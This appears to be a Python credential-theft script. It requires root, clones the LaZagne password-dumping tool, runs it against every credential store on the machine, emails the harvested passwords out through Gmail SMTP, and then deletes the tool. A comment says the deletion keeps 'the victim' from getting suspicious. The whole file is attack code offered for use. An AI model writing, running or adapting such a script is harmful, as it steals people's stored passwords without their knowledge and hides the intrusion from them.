#!/usr/bin/env python

import subprocess, smtplib
import os
import time
import sys
import re
import requests
import pip

def send_mail(user, pwd, recipient, subject, body):
    FROM = user
    TO = recipient
    SUBJECT = subject
    TEXT = body

    message = """From: %s\nTo: %s\nSubject: %s\n\n%s
    """ % (FROM, ", ".join(TO), SUBJECT, TEXT)
    try:
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.ehlo()
        server.starttls()
        server.login(user, pwd)
        server.sendmail(FROM, TO, message)
        server.close()
        print("[+]successfully sent the mail")
    except:
        print("failed to send mail")

def change_working_directory_to(self, path):
            os.chdir(path)
            return "[+] Changing working directory to " + path


def download(url):
    get_response = requests.get(url)
    file_name = url.split("/")[-1]
    with open(file_name, "wb") as out_file:
        out_file.write(get_response.content)
    
subject = "subject"

if os.geteuid() != 0:
    exit("[-] You must be root. Exiting....")
else:
    print("[+] You are root.")
    time.sleep(5)
    print("[+] We can continue...")

time.sleep(2)
email = raw_input("Enter your email address >> ")
password = raw_input("Enter your password >> ")

time.sleep(5)

try:
    print("[+] Commencing dependencies installation")
    command = "git clone https://github.com/AlessandroZ/LaZagne.git"
    subprocess.check_output(command, shell=True)
    print("[+] Done.")
except:
    exit("[-] Something went wrong. Exiting...")

try:
    command = "apt install python-pip"
    os.system(command)
except:
    exit("[-] Something went wrong while installing pip. Exiting...")


try:
    change_working_directory_to("cd", "LaZagne")
    time.sleep(2)
    
    command = "pip install -r requirements.txt"
    os.system(command)
except:
    exit("[-] Something went wrong. Exiting...")
    

try:
    change_working_directory_to("cd", "Linux")
    time.sleep(3)
    command = "python laZagne.py all -v"
    body = subprocess.check_output(command, shell=True)
    time.sleep(4)
    send_mail(email, password ,email, subject, body)
    
except:
    exit("[-] Something went wrong while running laZagne.py. Exiting...")
    
try:
    print("[+] Deleting Lazagne....")
    change_working_directory_to("cd", "..")
    time.sleep(2)
    change_working_directory_to("cd", "..")
    time.sleep(2)
    command = "rm -r LaZagne"
    os.system(command)
except:
    exit("[-] Something went wrong while deleting the password extactor. Exiting...")

time.sleep(3)
print("[+] Lazagne deleted. We do not want the victim to get suspicious!")
sys.exit()
    

    
    
    



    




